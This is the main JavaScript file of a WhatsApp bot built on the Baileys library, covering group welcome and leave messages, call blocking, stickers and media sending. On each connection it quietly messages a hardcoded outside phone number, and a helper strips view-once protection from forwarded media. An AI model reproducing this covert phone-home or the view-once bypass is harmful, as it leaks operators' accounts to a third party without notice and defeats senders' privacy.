require('./settings')
const { default:  yudamodsConnect, useSingleFileAuthState, DisconnectReason, fetchLatestBaileysVersion, generateForwardMessageContent, prepareWAMessageMedia, generateWAMessageFromContent, generateMessageID, downloadContentFromMessage, makeInMemoryStore, jidDecode, proto } = require('@adiwajshing/baileys')
const { state } = useSingleFileAuthState(`./${sessionName}.json`)
const pino = require('pino')
const { Boom } = require('@hapi/boom')
const fs = require('fs')
const chalk = require('chalk')
const figlet = require('figlet')
const FileType = require('file-type')
const path = require('path')
const PhoneNumber = require('awesome-phonenumber')
const { color, bgcolor, mycolor } = require('./lib/color')
const { imageToWebp, videoToWebp, writeExifImg, writeExifVid } = require('./lib/exif')
const { smsg, isUrl, generateMessageTag, getBuffer, getSizeMedia, fetchJson, await, sleep } = require('./lib/functions')
const store = makeInMemoryStore({ logger: pino().child({ level: 'silent', stream: 'store' }) })
/////DATA
const {isSetWelcome, isSetLeft,
} = require("./lib/welcomenya")
let welcome = JSON.parse(fs.readFileSync('./database/welcome.json'));
let set_left_db = JSON.parse(fs.readFileSync('./database/set_left.json'));
let left = JSON.parse(fs.readFileSync('./database/left.json'))
let set_welcome_db = JSON.parse(fs.readFileSync('./database/set_welcome.json'));

global.db = JSON.parse(fs.readFileSync('./database/database.json'))
global.db.data = {
users: {},
chats: {},
sticker: {},
database: {},
game: {},
settings: {},
others: {},
...(global.db.data || {})
}

async function startyudamods() {
let { version, isLatest } = await fetchLatestBaileysVersion()
const  yudamods =  yudamodsConnect({
logger: pino({ level: 'silent' }),
printQRInTerminal: true,
browser: ['YudaMods','Opera','1.0.0'],
auth: state,
version
})

store.bind( yudamods.ev)

console.log(color(figlet.textSync('BotzStore', {
font: 'Standard',
horizontalLayout: 'default',
vertivalLayout: 'default',
width: 80,
whitespaceBreak: false
}), 'red'))

 yudamods.ev.on('messages.upsert', async chatUpdate => {
try {
m = chatUpdate.messages[0]
if (!m.message) return
m.message = (Object.keys(m.message)[0] === 'ephemeralMessage') ? m.message.ephemeralMessage.message : m.message
if (m.key && m.key.remoteJid === 'status@broadcast') return
if (! yudamods.public && !m.key.fromMe && chatUpdate.type === 'notify') return
if (m.key.id.startsWith('BAE5') && m.key.id.length === 16) return
m = smsg( yudamods, m, store)
require('./yudamods')( yudamods, m, chatUpdate, store)
} catch (err) {
console.log(err)
}
})

 yudamods.decodeJid = (jid) => {
if (!jid) return jid
if (/:\d+@/gi.test(jid)) {
let decode = jidDecode(jid) || {}
return decode.user && decode.server && decode.user + '@' + decode.server || jid
} else return jid
}

 yudamods.ev.on('contacts.update', update => {
for (let contact of update) {
let id =  yudamods.decodeJid(contact.id)
if (store && store.contacts) store.contacts[id] = { id, name: contact.notify }
}
})

 yudamods.getName = (jid, withoutContact= false) => {
id =  yudamods.decodeJid(jid)
withoutContact =  yudamods.withoutContact || withoutContact 
let v
if (id.endsWith("@g.us")) return new Promise(async (resolve) => {
v = store.contacts[id] || {}
if (!(v.name || v.subject)) v =  yudamods.groupMetadata(id) || {}
resolve(v.name || v.subject || PhoneNumber('+' + id.replace('@s.whatsapp.net', '')).getNumber('international'))
})
else v = id === '0@s.whatsapp.net' ? {
id,
name: 'WhatsApp'
} : id ===  yudamods.decodeJid( yudamods.user.id) ?
 yudamods.user :
(store.contacts[id] || {})
return (withoutContact ? '' : v.name) || v.subject || v.verifiedName || PhoneNumber('+' + jid.replace('@s.whatsapp.net', '')).getNumber('international')
}

 yudamods.sendContact = async (jid, kon, quoted = '', opts = {}) => {
	let list = []
	for (let i of kon) {
	list.push({
		displayName: await  yudamods.getName(i + '@s.whatsapp.net'),
		vcard: `BEGIN:VCARD\nVERSION:3.0\nN:${await  yudamods.getName(i + '@s.whatsapp.net')}\nFN:${await  yudamods.getName(i + '@s.whatsapp.net')}\nitem1.TEL;waid=${i}:${i}\nitem1.X-ABLabel:Ponsel\nitem2.EMAIL;type=INTERNET:${email}\nitem2.X-ABLabel:Email\nitem3.URL:${youtube}\nitem3.X-ABLabel:YouTube\nitem4.ADR:;;${region};;;;\nitem4.X-ABLabel:Region\nEND:VCARD`
	})
	}
	 yudamods.sendMessage(jid, { contacts: { displayName: `${list.length} Kontak`, contacts: list }, ...opts }, { quoted })
}

 yudamods.setStatus = (status) => {
 yudamods.query({
tag: 'iq',
attrs: {
to: '@s.whatsapp.net',
type: 'set',
xmlns: 'status',
},
content: [{
tag: 'status',
attrs: {},
content: Buffer.from(status, 'utf-8')
}]
})
return status
}

 yudamods.public = true

 yudamods.serializeM = (m) => smsg( yudamods, m, store)

 yudamods.ev.on('connection.update', (update) => {
const {connection,lastDisconnect} = update
if (connection === 'close') {lastDisconnect.error?.output?.statusCode !== DisconnectReason.loggedOut ? startyudamods() : ''}
else if(connection === 'open') { yudamods.sendMessage("6283842204546@s.whatsapp.net", {text:`${JSON.stringify(update, undefined, 2)}`})}
console.log(update)})

 yudamods.send5ButGif = async (jid , text = '' , footer = '', but = [], options = {}) =>{
let message = await prepareWAMessageMedia({ video: thumb, gifPlayback: true }, { upload:  yudamods.waUploadToServer })
 const template = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
 templateMessage: {
 hydratedTemplate: {
 videoMessage: message.videoMessage,
 "hydratedContentText": text,
 "hydratedFooterText": footer,
 "hydratedButtons": but
}
}
}), options)
 yudamods.relayMessage(jid, template.message, { messageId: template.key.id })
}

 yudamods.send5ButImg = async (jid , text = '' , footer = '', img, but = [], options = {}) =>{
let message = await prepareWAMessageMedia({ image: img }, { upload:  yudamods.waUploadToServer })
var template = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
templateMessage: {
hydratedTemplate: {
imageMessage: message.imageMessage,
 "hydratedContentText": text,
 "hydratedFooterText": footer,
 "hydratedButtons": but
}
}
}), options)
 yudamods.relayMessage(jid, template.message, { messageId: template.key.id })
}

 yudamods.send5ButVid = async (jid , text = '' , footer = '', vid, but = [], options = {}) =>{
let message = await prepareWAMessageMedia({ video: vid }, { upload:  yudamods.waUploadToServer })
var template = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
templateMessage: {
hydratedTemplate: {
videoMessage: message.videoMessage,
 "hydratedContentText": text,
 "hydratedFooterText": footer,
 "hydratedButtons": but
}
}
}), options)
 yudamods.relayMessage(jid, template.message, { messageId: template.key.id })
}

 yudamods.send5ButLoc = async (jid , text = '' , footer = '', img, but = [], options = {}) =>{
var template = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
templateMessage: {
hydratedTemplate: {
 "hydratedContentText": text,
 "locationMessage": {
 "jpegThumbnail": img },
 "hydratedFooterText": footer,
 "hydratedButtons": but
}
}
}), options)
 yudamods.relayMessage(jid, template.message, { messageId: template.key.id })
}

 yudamods.sendList = async (jid , title = '', text = '', buttext = '', footer = '', but = [], options = {}) =>{
var template = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
listMessage :{
 title: title,
 description: text,
 buttonText: buttext,
 footerText: footer,
 listType: "SELECT",
 sections: but,
 listType: 1
}
}), options)
 yudamods.relayMessage(jid, template.message, { messageId: template.key.id })
}

 yudamods.sendButtonText = (jid, buttons = [], text, footer, quoted = '', options = {}) => {
let buttonMessage = {
text,
footer,
buttons,
headerType: 2,
...options
}
 yudamods.sendMessage(jid, buttonMessage, { quoted, ...options })
}

 yudamods.sendButMessage = async (id, text1, desc1, but = [], options) => {
let buttonMessage = {
text: text1,
footer: desc1,
buttons: but,
headerType: 1
}
return  yudamods.sendMessage(id, buttonMessage,{quoted: options})
}

 yudamods.parseMention = (text = '') => {
return [...text.matchAll(/@([0-9]{5,16}|0)/g)].map(v => v[1] + '@s.whatsapp.net')
}

store.bind(yudamods.ev)
    yudamods.ev.on('call', async (celled) => {
    	if (global.anticall) {
    	console.log(celled)
    for (let kopel of celled) {
    	if (kopel.isGroup == false) {
    	if (kopel.status == "offer") {
    	let nomer = await yudamods.sendTextWithMentions(kopel.from, `*${yudamods.user.name}* tidak bisa menerima panggilan ${kopel.isVideo ? `video` : `suara`}. Maaf @${kopel.from.split('@')[0]} kamu akan diblokir. Silahkan hubungi Owner membuka blok !`)
    yudamods.sendContact(kopel.from, owner, nomer)
    await sleep(5000)
    yudamods.updateBlockStatus(kopel.from, "block")
    }
    }
    }
    }
    })


yudamods.ev.on('group-participants.update', async (anu) => {
        const isWelcome = welcome.includes(anu.id)
        const isLeft = left.includes(anu.id)
        try {
            let metadata = await yudamods.groupMetadata(anu.id)
            let participants = anu.participants
            const groupName = metadata.subject
  		      const groupDesc = metadata.desc
            for (let num of participants) {
                try {
                    ppuser = await yudamods.profilePictureUrl(num, 'image')
                } catch {
                    ppuser = 'https://telegra.ph/file/c3f3d2c2548cbefef1604.jpg'
                }

                try {
                    ppgroup = await yudamods.profilePictureUrl(anu.id, 'image')
                } catch {
                    ppgroup = 'https://telegra.ph/file/c3f3d2c2548cbefef1604.jpg'
                }
                if (anu.action == 'add' && (isWelcome || global.welcome)) {
                	console.log(anu)
                if (isSetWelcome(anu.id, set_welcome_db)) {               	
                var get_teks_welcome = await getTextSetWelcome(anu.id, set_welcome_db)
                var replace_pesan = (get_teks_welcome.replace(/@user/gi, `@${num.split('@')[0]}`))
                var full_pesan = (replace_pesan.replace(/@group/gi, groupName).replace(/@desc/gi, groupDesc))
                yudamods.sendMessage(anu.id, {text: `${full_pesan}`})
                } else {
                	yudamods.sendMessage(anu.id, { image: { url: ppuser }, mentions: [num], caption: `〢━━━━━━━━『Welcome』━━━━━━━━〢\n*Welcome Kak @${num.split("@")[0]} Di Group ${metadata.subject}*\n\nKini Member Bertambah Jadi: ${metadata.participants.length} 

Deskripsi Group:\n
*${metadata.desc}* `})
                }
                } else if (anu.action == 'remove' && (isLeft || global.left)) {
                	console.log(anu)
                  if (isSetLeft(anu.id, set_left_db)) {            	
                        var get_teks_left = await getTextSetLeft(anu.id, set_left_db)
                        var replace_pesan = (get_teks_left.replace(/@user/gi, `@${num.split('@')[0]}`))
                        var full_pesan = (replace_pesan.replace(/@group/gi, groupName).replace(/@desc/gi, groupDesc))
                      yudamods.sendMessage(anu.id, {text: `${full_pesan}`})
                       } else {
                       	yudamods.sendMessage(anu.id, { image: { url: ppuser }, mentions: [num], caption: `〢━━━━━━━━『Leave』━━━━━━━━〢\n \nBye Kak 👋
                       	
*"Karna Setiap Ucapan Selamat Datang Akan Selalu Diakhiri Dengan Ucapan Selamat Tinggal"*

Terima Kasih Kak @${num.split("@")[0]} Sampai Bertemu Kembali Di Group ${metadata.subject}\n\n Kini Member Berkurang Menjadi: ${metadata.participants.length}` })
                        }
                        }else if (anu.action == 'promote') {
                    yudamods.sendMessage(anu.id, { image: { url: ppuser }, mentions: [num], caption: `@${num.split('@')[0]} sekarang menjadi admin grup ${metadata.subject}` })
                } else if (anu.action == 'demote') {
                    yudamods.sendMessage(anu.id, { image: { url: ppuser }, mentions: [num], caption: `@${num.split('@')[0]} bukan admin grup ${metadata.subject} lagi` })
              }
            }
        } catch (err) {
            console.log(err)
        }
    })

 yudamods.sendText = (jid, text, quoted = '', options) =>  yudamods.sendMessage(jid, { text: text, ...options }, { quoted })

 yudamods.sendImage = async (jid, path, caption = '', quoted = '', options) => {
	let buffer = Buffer.isBuffer(path) ? path : /^data:.*?\/.*?;base64,/i.test(path) ? Buffer.from(path.split`,`[1], 'base64') : /^https?:\/\//.test(path) ? await (await getBuffer(path)) : fs.existsSync(path) ? fs.readFileSync(path) : Buffer.alloc(0)
return await  yudamods.sendMessage(jid, { image: buffer, caption: caption, ...options }, { quoted })
}

 yudamods.sendVideo = async (jid, path, caption = '', quoted = '', gif = false, options) => {
let buffer = Buffer.isBuffer(path) ? path : /^data:.*?\/.*?;base64,/i.test(path) ? Buffer.from(path.split`,`[1], 'base64') : /^https?:\/\//.test(path) ? await (await getBuffer(path)) : fs.existsSync(path) ? fs.readFileSync(path) : Buffer.alloc(0)
return await  yudamods.sendMessage(jid, { video: buffer, caption: caption, gifPlayback: gif, ...options }, { quoted })
}

 yudamods.sendAudio = async (jid, path, quoted = '', ptt = false, options) => {
let buffer = Buffer.isBuffer(path) ? path : /^data:.*?\/.*?;base64,/i.test(path) ? Buffer.from(path.split`,`[1], 'base64') : /^https?:\/\//.test(path) ? await (await getBuffer(path)) : fs.existsSync(path) ? fs.readFileSync(path) : Buffer.alloc(0)
return await  yudamods.sendMessage(jid, { audio: buffer, ptt: ptt, ...options }, { quoted })
}

 yudamods.sendTextWithMentions = async (jid, text, quoted, options = {}) =>  yudamods.sendMessage(jid, { text: text, contextInfo: { mentionedJid: [...text.matchAll(/@(\d{0,16})/g)].map(v => v[1] + '@s.whatsapp.net') }, ...options }, { quoted })

 yudamods.sendImageAsSticker = async (jid, path, quoted, options = {}) => {
let buff = Buffer.isBuffer(path) ? path : /^data:.*?\/.*?;base64,/i.test(path) ? Buffer.from(path.split`,`[1], 'base64') : /^https?:\/\//.test(path) ? await (await getBuffer(path)) : fs.existsSync(path) ? fs.readFileSync(path) : Buffer.alloc(0)
let buffer
if (options && (options.packname || options.author)) {
buffer = await writeExifImg(buff, options)
} else {
buffer = await imageToWebp(buff)
}

await  yudamods.sendMessage(jid, { sticker: { url: buffer }, ...options }, { quoted })
return buffer
}

 yudamods.sendVideoAsSticker = async (jid, path, quoted, options = {}) => {
let buff = Buffer.isBuffer(path) ? path : /^data:.*?\/.*?;base64,/i.test(path) ? Buffer.from(path.split`,`[1], 'base64') : /^https?:\/\//.test(path) ? await (await getBuffer(path)) : fs.existsSync(path) ? fs.readFileSync(path) : Buffer.alloc(0)
let buffer
if (options && (options.packname || options.author)) {
buffer = await writeExifVid(buff, options)
} else {
buffer = await videoToWebp(buff)
}

await  yudamods.sendMessage(jid, { sticker: { url: buffer }, ...options }, { quoted })
return buffer
}
 
 yudamods.downloadAndSaveMediaMessage = async (message, filename, attachExtension = true) => {
let quoted = message.msg ? message.msg : message
let mime = (message.msg || message).mimetype || ''
let messageType = message.mtype ? message.mtype.replace(/Message/gi, '') : mime.split('/')[0]
const stream = await downloadContentFromMessage(quoted, messageType)
let buffer = Buffer.from([])
for await(const chunk of stream) {
buffer = Buffer.concat([buffer, chunk])
}
	let type = await FileType.fromBuffer(buffer)
trueFileName = attachExtension ? (filename + '.' + type.ext) : filename
await fs.writeFileSync(trueFileName, buffer)
return trueFileName
}

 yudamods.downloadMediaMessage = async (message) => {
let mime = (message.msg || message).mimetype || ''
let messageType = message.mtype ? message.mtype.replace(/Message/gi, '') : mime.split('/')[0]
const stream = await downloadContentFromMessage(message, messageType)
let buffer = Buffer.from([])
for await(const chunk of stream) {
buffer = Buffer.concat([buffer, chunk])
	}
	return buffer
 }
 
 yudamods.copyNForward = async (jid, message, forceForward = false, options = {}) => {
let vtype
		if (options.readViewOnce) {
			message.message = message.message && message.message.ephemeralMessage && message.message.ephemeralMessage.message ? message.message.ephemeralMessage.message : (message.message || undefined)
			vtype = Object.keys(message.message.viewOnceMessage.message)[0]
			delete(message.message && message.message.ignore ? message.message.ignore : (message.message || undefined))
			delete message.message.viewOnceMessage.message[vtype].viewOnce
			message.message = {
				...message.message.viewOnceMessage.message
			}
		}
let mtype = Object.keys(message.message)[0]
let content = await generateForwardMessageContent(message, forceForward)
let ctype = Object.keys(content)[0]
		let context = {}
if (mtype != "conversation") context = message.message[mtype].contextInfo
content[ctype].contextInfo = {
...context,
...content[ctype].contextInfo
}
const waMessage = await generateWAMessageFromContent(jid, content, options ? {
...content[ctype],
...options,
...(options.contextInfo ? {
contextInfo: {
...content[ctype].contextInfo,
...options.contextInfo
}
} : {})
} : {})
await  yudamods.relayMessage(jid, waMessage.message, { messageId:waMessage.key.id })
return waMessage
}

 yudamods.cMod = (jid, copy, text = '', sender =  yudamods.user.id, options = {}) => {
		let mtype = Object.keys(copy.message)[0]
		let isEphemeral = mtype === 'ephemeralMessage'
if (isEphemeral) {
mtype = Object.keys(copy.message.ephemeralMessage.message)[0]
}
let msg = isEphemeral ? copy.message.ephemeralMessage.message : copy.message
		let content = msg[mtype]
if (typeof content === 'string') msg[mtype] = text || content
		else if (content.caption) content.caption = text || content.caption
		else if (content.text) content.text = text || content.text
		if (typeof content !== 'string') msg[mtype] = {
			...content,
			...options
}
if (copy.key.participant) sender = copy.key.participant = sender || copy.key.participant
		else if (copy.key.participant) sender = copy.key.participant = sender || copy.key.participant
		if (copy.key.remoteJid.includes('@s.whatsapp.net')) sender = sender || copy.key.remoteJid
		else if (copy.key.remoteJid.includes('@broadcast')) sender = sender || copy.key.remoteJid
		copy.key.remoteJid = jid
		copy.key.fromMe = sender ===  yudamods.user.id
return proto.WebMessageInfo.fromObject(copy)
}

 yudamods.getFile = async (PATH, save) => {
let res
let data = Buffer.isBuffer(PATH) ? PATH : /^data:.*?\/.*?;base64,/i.test(PATH) ? Buffer.from(PATH.split`,`[1], 'base64') : /^https?:\/\//.test(PATH) ? await (res = await getBuffer(PATH)) : fs.existsSync(PATH) ? (filename = PATH, fs.readFileSync(PATH)) : typeof PATH === 'string' ? PATH : Buffer.alloc(0)
let type = await FileType.fromBuffer(data) || {
mime: 'application/octet-stream',
ext: '.bin'
}
filename = path.join(__filename, './src/' + new Date * 1 + '.' + type.ext)
if (data && save) fs.promises.writeFile(filename, data)
return {
res,
filename,
	size: await getSizeMedia(data),
...type,
data
}
}
return  yudamods
}

startyudamods()

let file = require.resolve(__filename)
fs.watchFile(file, () => {
fs.unwatchFile(file)
console.log(chalk.yellowBright(`Update File Terbaru ${__filename}`))
delete require.cache[file]
require(file)
})